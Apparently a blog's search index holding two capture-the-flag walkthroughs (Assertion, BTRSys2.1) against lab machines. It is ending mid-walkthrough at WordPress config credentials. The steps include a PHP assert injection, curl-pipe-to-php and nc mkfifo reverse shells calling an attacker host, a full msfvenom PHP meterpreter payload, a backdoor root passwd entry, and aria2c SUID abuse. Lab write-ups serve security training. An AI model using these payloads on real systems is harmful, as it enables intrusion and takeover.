<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Assertion101</title>
    <url>/undefined/Assertion101/</url>
    <content><![CDATA[<h1 id="Assertion101"><a href="#Assertion101" class="headerlink" title="Assertion101"></a>Assertion101</h1><h1 id="Exploitation-Guide-for-Assertion"><a href="#Exploitation-Guide-for-Assertion" class="headerlink" title="Exploitation Guide for Assertion"></a><strong>Exploitation Guide for Assertion</strong></h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a><strong>Summary</strong></h2><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a><strong>Enumeration</strong></h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a><strong>Nmap</strong></h3><p>We start off by running an <code>nmap</code> scan:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo nmap 192.168.120.218</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-07 12:06 EDT</span><br><span class="line">Nmap scan report for 192.168.120.218</span><br><span class="line">Host is up (0.041s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Web-application"><a href="#Web-application" class="headerlink" title="Web application"></a><strong>Web application</strong></h3><p>Let’s explore the web app on port 80.We can see that the menu at the top of the page contains a <code>page</code> parameter that seems particularly interesting.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;zxx&quot;&gt;</span><br><span class="line">...</span><br><span class="line">&lt;body&gt;</span><br><span class="line">...</span><br><span class="line">            &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">                &lt;div class=&quot;nav-menu&quot;&gt;</span><br><span class="line">                    &lt;nav class=&quot;mainmenu mobile-menu&quot;&gt;</span><br><span class="line">                        &lt;ul&gt;</span><br><span class="line">                            &lt;li class=&quot;active&quot;&gt;&lt;a href=&quot;index.php&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">                            &lt;li&gt;&lt;a href=&quot;index.php?page=about&quot;&gt;About us&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">                            &lt;li&gt;&lt;a href=&quot;index.php?page=schedule&quot;&gt;Schedule&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">                            &lt;li&gt;&lt;a href=&quot;index.php?page=gallery&quot;&gt;Gallery&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">                            &lt;li&gt;&lt;a href=&quot;index.php?page=blog&quot;&gt;Blog&lt;/a&gt;</span><br><span class="line">                                &lt;ul class=&quot;dropdown&quot;&gt;</span><br><span class="line">                                    &lt;li&gt;&lt;a href=&quot;index.php?page=about&quot;&gt;About Us&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">                                    &lt;li&gt;&lt;a href=&quot;index.php?page=blog-single&quot;&gt;Blog Details&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">                                &lt;/ul&gt;</span><br><span class="line">                            &lt;/li&gt;</span><br><span class="line">                            &lt;li&gt;&lt;a href=&quot;index.php?page=contact&quot;&gt;Contacts&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">                        &lt;/ul&gt;</span><br><span class="line">                    &lt;/nav&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>This seems like a good candidate for an LFI attack.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ curl &quot;http://192.168.120.218/index.php?page=../../../etc/passwd&quot;</span><br><span class="line">Not so easy brother!</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Looks like we’ll have a harder time than we thought.</p>
<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a><strong>Exploitation</strong></h2><h3 id="PHP-assertions"><a href="#PHP-assertions" class="headerlink" title="PHP assertions"></a><strong>PHP assertions</strong></h3><p>Going from the machine name and the php file extensions, we can guess that the machine is about php assertions.By using Google to search for ways to bypass php assertions, we find similar challenges and we get some suggestions to try.After a couple of tries, we find that the following payload works wonders:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">page=&#x27; and die(system(&#x27;cat /etc/passwd&#x27;)) or &#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Not forgetting to URL encode the spaces, we use <code>curl</code> to send it.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ curl &quot;http://192.168.120.218/index.php?page=&#x27;+and+die(system(&#x27;cat+/etc/passwd&#x27;))+or+&#x27;&quot;</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin</span><br><span class="line">syslog:x:102:106::/home/syslog:/usr/sbin/nologin</span><br><span class="line">messagebus:x:103:107::/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:104:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">lxd:x:105:65534::/var/lib/lxd/:/bin/false</span><br><span class="line">uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin</span><br><span class="line">landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin</span><br><span class="line">pollinate:x:109:1::/var/cache/pollinate:/bin/false</span><br><span class="line">sshd:x:110:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">soz:x:1000:1000:Faisal:/home/soz:/bin/bash</span><br><span class="line">fnx:x:1001:1001::/home/fnx:/bin/sh</span><br><span class="line">fnx:x:1001:1001::/home/fnx:/bin/sh</span><br><span class="line">kali@kali:~$</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Now that we can inject code, we can download and run a reverse shell payload.</p>
<p>Let’s first start by copying the shell from <strong>/usr/share/webshells/php/php-reverse-shell.php</strong> and editing it with our local machine’s IP and port.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ cp /usr/share/webshells/php/php-reverse-shell.php /tmp/assertion-shell.php</span><br><span class="line">kali@kali:~$ cd /tmp/</span><br><span class="line">kali@kali:/tmp$ grep &#x27;CHANGE THIS&#x27; assertion-shell.php</span><br><span class="line">$ip = &#x27;127.0.0.1&#x27;;  // CHANGE THIS</span><br><span class="line">$port = 1234;       // CHANGE THIS</span><br><span class="line"></span><br><span class="line">kali@kali:/tmp$ vim assertion-shell.php</span><br><span class="line">kali@kali:/tmp$ grep &#x27;CHANGE THIS&#x27; assertion-shell.php</span><br><span class="line">$ip = &#x27;192.168.118.9&#x27;;  // CHANGE THIS</span><br><span class="line">$port = 443;       // CHANGE THIS</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Then start a web server to serve the file.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:/tmp$ sudo python3 -m http.server 80</span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Start our netcat listener.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo nc -nvlp 443</span><br><span class="line">listening on [any] 443 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>And trigger it.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ curl &quot;http://192.168.120.218/index.php?page=&#x27;+and+die(system(&#x27;curl+http://192.168.118.9/assertion-shell.php|php&#x27;))+or+&#x27;&quot;</span><br></pre></td></tr></table></figure>

<p>We receive the shell on our listener.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo nc -nvlp 443listening on [any] 443 ...connect to [192.168.118.9] from (UNKNOWN) [192.168.120.218] 36032Linux assertion 4.15.0-74-generic #84-Ubuntu SMP Thu Dec 19 08:06:28 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 19:00:04 up 2 days, 22:37,  0 users,  load average: 0.00, 0.00, 0.00USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHATuid=33(www-data) gid=33(www-data) groups=33(www-data)/bin/sh: 0: can&#x27;t access tty; job control turned off$ python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;www-data@assertion:/$</span><br></pre></td></tr></table></figure>

<h2 id="Escalation"><a href="#Escalation" class="headerlink" title="Escalation"></a><strong>Escalation</strong></h2><h3 id="Local-Enumeration"><a href="#Local-Enumeration" class="headerlink" title="Local Enumeration"></a><strong>Local Enumeration</strong></h3><p>Let’s explore the SUID binaries.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@assertion:/$ find / -perm -4000 2&gt;/dev/nullfind / -perm -4000 2&gt;/dev/null/usr/lib/openssh/ssh-keysign/usr/lib/eject/dmcrypt-get-device/usr/lib/policykit-1/polkit-agent-helper-1/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/snapd/snap-confine/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic/usr/bin/at/usr/bin/aria2c/usr/bin/newgrp/usr/bin/newgidmap/usr/bin/newuidmap/usr/bin/passwd/usr/bin/pkexec/usr/bin/sudo/usr/bin/chsh/usr/bin/traceroute6.iputils/usr/bin/gpasswd/usr/bin/chfn/bin/ping/bin/mount/bin/fusermount/bin/su/bin/umount...www-data@assertion:/$</span><br></pre></td></tr></table></figure>

<p>Of particular note is the <code>/usr/bin/aria2c</code> executable, which is a command line download utility.We can use it to overwrite some important files.For example, we can use it to overwrite the root’s <strong>authorized_keys</strong> file.</p>
<p>Let’s start a web server in our local machine’s <em>.ssh</em> folder to get our public key on the remote machine.If you don’t have an SSH key pair created, you can use the <code>ssh-keygen</code> command.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ cd ~/.ssh/kali@kali:~/.ssh$ sudo python3 -m http.server 80Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span><br></pre></td></tr></table></figure>

<p>Then use <code>aria2c</code> to download it in the <strong>authorized_keys</strong> file.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@assertion:/$ /usr/bin/aria2c -d /root/.ssh/ -o authorized_keys &quot;http://192.168.118.9/id_rsa.pub&quot; --allow-overwrite=true&lt;://192.168.118.9/id_rsa.pub&quot; --allow-overwrite=true09/07 19:24:05 [NOTICE] Downloading 1 item(s)09/07 19:24:05 [NOTICE] Download complete: /root/.ssh//authorized_keysDownload Results:gid   |stat|avg speed  |path/URI======+====+===========+=======================================================32eb0a|OK  |   552KiB/s|/root/.ssh//authorized_keysStatus Legend:(OK):download completed.www-data@assertion:/$</span><br></pre></td></tr></table></figure>

<p>We can now ssh to the machine as root.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ ssh root@192.168.120.218...root@assertion:~# iduid=0(root) gid=0(root) groups=0(root)root@assertion:~#</span><br></pre></td></tr></table></figure>

<p>Focus：</p>
<p>URL//http://$ip/index.php?page=’ and die(show_source(‘/etc/passwd’)) or ‘</p>
<p>First (Msfvenom Payload)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#Create payload**msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f elf &gt; shell.elf**#Wget into /tmp (Url Encoded)**&#x27; and die(system(&quot;wget &#x27;http://&lt;ip&gt;/shell.elf&#x27; -O /tmp/shell.elf&quot;)) or &#x27;**#Run while use multi/handler**&#x27; and die(system(&quot;/tmp/shell.elf&quot;)) or &#x27;**</span><br></pre></td></tr></table></figure>

<p>Second (Curl Php)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#Create a php reverse shell (shell.php)</span><br><span class="line"></span><br><span class="line">**&lt;?php</span><br><span class="line">    system(&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.0.142 9001 &gt;/tmp/f&#x27;);</span><br><span class="line">?&gt;**</span><br><span class="line"></span><br><span class="line">#Curl and listen (Url Encoded)</span><br><span class="line"></span><br><span class="line">**&#x27; and die(system(&quot;curlhttp://$IP/shell.php|php&quot;)) or &#x27;**</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#Copy /etc/passwd by read as a root</span><br><span class="line"></span><br><span class="line">**/usr/bin/aria2c -i /etc/passwd**</span><br><span class="line"></span><br><span class="line">#Add user with root rigts in the file</span><br><span class="line"></span><br><span class="line">**Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash**</span><br><span class="line"></span><br><span class="line">#Upload it inside /etc (must be in /etc directory)</span><br><span class="line"></span><br><span class="line">**/usr/bin/aria2c -o passwd &quot;http://&lt;ip&gt;/newpasswd&quot; --allow-overwrite=true**</span><br><span class="line"></span><br><span class="line">#Get the shell! </span><br><span class="line">(Pass : Password@973)</span><br><span class="line">su Tom</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux Walkthrough</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>Reverse Shell</tag>
        <tag>Authorized_keys</tag>
        <tag>Msfvenom</tag>
      </tags>
  </entry>
  <entry>
    <title>BTRSys2.1</title>
    <url>/undefined/BTRSys2-1/</url>
    <content><![CDATA[<h1 id="Exploitation-Guide-for-BTRSys2-1"><a href="#Exploitation-Guide-for-BTRSys2-1" class="headerlink" title="Exploitation Guide for BTRSys2.1"></a><strong>Exploitation Guide for BTRSys2.1</strong></h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a><strong>Summary</strong></h2><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a><strong>Enumeration</strong></h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a><strong>Nmap</strong></h3><p>We start off by running an <code>nmap</code> scan:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo nmap 192.168.120.40</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-06 10:08 EST</span><br><span class="line">Nmap scan report for 192.168.120.40</span><br><span class="line">Host is up (0.028s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">21/tcp open  ftp</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Let’s run a version scan against the discovered ports:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo nmap -p 21,22,80 -sV -O 192.168.120.40</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-06 10:20 EST</span><br><span class="line">Nmap scan report for 192.168.120.40</span><br><span class="line">Host is up (0.030s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Linux 3.2.0 (95%), Linux 3.11 - 4.1 (94%), Linux 4.4 (94%), Linux 2.6.18 - 2.6.22 (94%), Linux 3.16 (92%), Linux 3.13 (92%), Linux 3.10 - 3.16 (91%), Linux 3.10 - 4.11 (90%), Linux 3.12 (90%), Linux 3.13 or 4.2 (90%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We see that the web server on port 80 is Apache.</p>
<h3 id="Nikto"><a href="#Nikto" class="headerlink" title="Nikto"></a><strong>Nikto</strong></h3><p>Next, we will scan the website with <code>nikto</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ nikto -h 192.168.120.40</span><br><span class="line">- Nikto v2.1.6</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          192.168.120.40</span><br><span class="line">+ Target Hostname:    192.168.120.40</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ Start Time:         2020-03-06 10:24:42 (GMT-5)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: Apache/2.4.18 (Ubuntu)</span><br><span class="line">+ The anti-clickjacking X-Frame-Options header is not present.</span><br><span class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span><br><span class="line">+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</span><br><span class="line">+ No CGI Directories found (use &#x27;-C all&#x27; to force check all possible dirs)</span><br><span class="line">+ Entry &#x27;/wordpress/&#x27; in robots.txt returned a non-forbidden or redirect HTTP code (200)</span><br><span class="line">+ &quot;robots.txt&quot; contains 2 entries which should be manually viewed.</span><br><span class="line">+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.</span><br><span class="line">+ Server may leak inodes via ETags, header found with file /, inode: 51, size: 54e208f152180, mtime: gzip</span><br><span class="line">+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS</span><br><span class="line">+ OSVDB-3233: /icons/README: Apache default file found.</span><br><span class="line">+ 7917 requests: 0 error(s) and 9 item(s) reported on remote host</span><br><span class="line">+ End Time:           2020-03-06 10:29:29 (GMT-5) (287 seconds)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ 1 host(s) tested</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>This scan identifies the <em>/wordpress/</em> directory on the server.</p>
<h3 id="Dirb"><a href="#Dirb" class="headerlink" title="Dirb"></a><strong>Dirb</strong></h3><p>Let’s also brute-force the server’s hidden directories with <code>dirb</code> and the common wordlist:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ dirb http://192.168.120.40/</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22</span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Fri Mar  6 10:26:30 2020</span><br><span class="line">URL_BASE: http://192.168.120.40/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612</span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.120.40/ ----</span><br><span class="line">+ http://192.168.120.40/index.html (CODE:200|SIZE:81)</span><br><span class="line">==&gt; DIRECTORY: http://192.168.120.40/javascript/</span><br><span class="line">+ http://192.168.120.40/LICENSE (CODE:200|SIZE:1672)</span><br><span class="line">+ http://192.168.120.40/robots.txt (CODE:200|SIZE:1451)</span><br><span class="line">+ http://192.168.120.40/server-status (CODE:403|SIZE:302)</span><br><span class="line">==&gt; DIRECTORY: http://192.168.120.40/upload/</span><br><span class="line">==&gt; DIRECTORY: http://192.168.120.40/wordpress/</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>The brute-force scan also finds the <em>/wordpress/</em> directory.</p>
<h3 id="WPScan"><a href="#WPScan" class="headerlink" title="WPScan"></a><strong>WPScan</strong></h3><p>Navigating to <a href="http://192.168.120.40/wordpress/">http://192.168.120.40/wordpress/</a>, we indeed find a Wordpress site. Let’s scan it with <code>wpscan</code> as follows:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ wpscan --url http://192.168.120.40/wordpress/ --enumerate at --enumerate ap --enumerate u</span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#x27;_ \</span><br><span class="line">            \  /\  /  | |     ____) | (__| (_| | | | |</span><br><span class="line">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span><br><span class="line"></span><br><span class="line">         WordPress Security Scanner by the WPScan Team</span><br><span class="line">                         Version 3.7.8</span><br><span class="line">       Sponsored by Automattic - https://automattic.com/</span><br><span class="line">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="line">_______________________________________________________________</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] btrisk</span><br><span class="line"> | Found By: Author Posts - Display Name (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Rss Generator (Passive Detection)</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressi</span><br><span class="line"> ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>The Wordpress scanner finds two users on the application: <code>btrisk</code> and <code>admin</code>.</p>
<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a><strong>Exploitation</strong></h2><h3 id="Guessing-User’s-Password"><a href="#Guessing-User’s-Password" class="headerlink" title="Guessing User’s Password"></a><strong>Guessing User’s Password</strong></h3><p>Before we start brute-forcing the discovered users’ credentials in the application, we can employ some easy guesswork to find that the password for the <code>admin</code> user is also <code>admin</code>. We are able to successfully log in at <a href="http://192.168.120.40/wordpress/wp-login.php">http://192.168.120.40/wordpress/wp-login.php</a> as <code>admin:admin</code>.</p>
<h3 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a><strong>Reverse Shell</strong></h3><p>Having authenticated to the application, we can gain an easy reverse shell using Wordpress theme template files. First, let’s create our PHP shellcode:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.118.3 lport=4444 -f raw</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload</span><br><span class="line">[-] No arch selected, selecting arch: php from the payload</span><br><span class="line">No encoder or badchars specified, outputting raw payload</span><br><span class="line">Payload size: 1114 bytes</span><br><span class="line">/*&lt;?php /**/ error_reporting(0); $ip = &#x27;192.168.118.3&#x27;; $port = 4444; if (($f = &#x27;stream_socket_client&#x27;) &amp;&amp; is_callable($f)) &#123; $s = $f(&quot;tcp://&#123;$ip&#125;:&#123;$port&#125;&quot;); $s_type = &#x27;stream&#x27;; &#125; if (!$s &amp;&amp; ($f = &#x27;fsockopen&#x27;) &amp;&amp; is_callable($f)) &#123; $s = $f($ip, $port); $s_type = &#x27;stream&#x27;; &#125; if (!$s &amp;&amp; ($f = &#x27;socket_create&#x27;) &amp;&amp; is_callable($f)) &#123; $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) &#123; die(); &#125; $s_type = &#x27;socket&#x27;; &#125; if (!$s_type) &#123; die(&#x27;no socket funcs&#x27;); &#125; if (!$s) &#123; die(&#x27;no socket&#x27;); &#125; switch ($s_type) &#123; case &#x27;stream&#x27;: $len = fread($s, 4); break; case &#x27;socket&#x27;: $len = socket_read($s, 4); break; &#125; if (!$len) &#123; die(); &#125; $a = unpack(&quot;Nlen&quot;, $len); $len = $a[&#x27;len&#x27;]; $b = &#x27;&#x27;; while (strlen($b) &lt; $len) &#123; switch ($s_type) &#123; case &#x27;stream&#x27;: $b .= fread($s, $len-strlen($b)); break; case &#x27;socket&#x27;: $b .= socket_read($s, $len-strlen($b)); break; &#125; &#125; $GLOBALS[&#x27;msgsock&#x27;] = $s; $GLOBALS[&#x27;msgsock_type&#x27;] = $s_type; if (extension_loaded(&#x27;suhosin&#x27;) &amp;&amp; ini_get(&#x27;suhosin.executor.disable_eval&#x27;)) &#123; $suhosin_bypass=create_function(&#x27;&#x27;, $b); $suhosin_bypass(); &#125; else &#123; eval($b); &#125; die();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Next, we will navigate to <code>Appearance -&gt; Editor</code> and open the <strong>404.php</strong> template file. We can paste our PHP shellcode inside that file and then click <strong>Update FIle</strong> to save it:</p>
<p><img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Play_23_image_2_taLxzRPA.png" alt="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Play_23_image_2_taLxzRPA.png"></p>
<p>We can now set up a meterpreter handler to catch our reverse shell:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ msfconsole</span><br><span class="line">...</span><br><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; php/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set LHOST 192.168.118.3</span><br><span class="line">LHOST =&gt; 192.168.118.3</span><br><span class="line">msf5 exploit(multi/handler) &gt; set LPORT 4444</span><br><span class="line">LPORT =&gt; 4444</span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.118.3:4444</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Finally, let’s trigger the shell by navigating to <a href="http://192.168.120.40/wordpress/wp-content/themes/twentyfourteen/404.php">http://192.168.120.40/wordpress/wp-content/themes/twentyfourteen/404.php</a>. If we look back to our handler, we have received our shell:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.118.3:4444</span><br><span class="line">[*] Sending stage (38288 bytes) to 192.168.120.40</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.118.3:4444 -&gt; 192.168.120.40:51206) at 2020-03-06 10:47:47 -0500</span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 895 created.</span><br><span class="line">Channel 0 created.</span><br><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentyfourteen$ whoami</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line">www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentyfourteen$</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Escalation"><a href="#Escalation" class="headerlink" title="Escalation"></a><strong>Escalation</strong></h2><h3 id="Database-Credentials-Recovery"><a href="#Database-Credentials-Recovery" class="headerlink" title="Database Credentials Recovery"></a><strong>Database Credentials Recovery</strong></h3><p>We will navigate to the <em>wordpress</em> directory on the server and check for any configuration files present:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentyfourteen$ cd /var/www/html/wordpresscd /var/www/html/wordpresswww-data@ubuntu:/var/www/html/wordpress$ lslsindex.php	 wp-blog-header.php    wp-cron.php	  wp-mail.phplicense.txt	 wp-comments-post.php  wp-includes	  wp-settings.phpreadme.html	 wp-config-sample.php  wp-links-opml.php  wp-signup.phpwp-activate.php  wp-config.php	       wp-load.php	  wp-trackback.phpwp-admin	 wp-content	       wp-login.php	  xmlrpc.php</span><br></pre></td></tr></table></figure>

<p>The <strong>wp-config.php</strong> file looks promising. Looking inside, we find database credentials:</p>
